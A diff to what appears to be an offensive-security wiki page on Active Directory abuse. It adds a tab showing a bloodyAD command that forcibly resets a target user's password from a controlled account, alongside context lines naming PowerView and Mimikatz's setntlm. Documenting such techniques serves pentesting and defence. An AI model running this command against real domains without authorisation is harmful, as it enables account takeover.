@@ -35,4 +35,12 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 
 Mimikatz's [`lsadump::setntlm`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/setntlm) can also be used for that purpose.
 {% endtab %}
+
+{% tab title="Windows/UNIX-like" %}
+It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
+```bash
+bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password set password $TargetUser $NewPassword
+```
+{% endtab %}
+
 {% endtabs %}
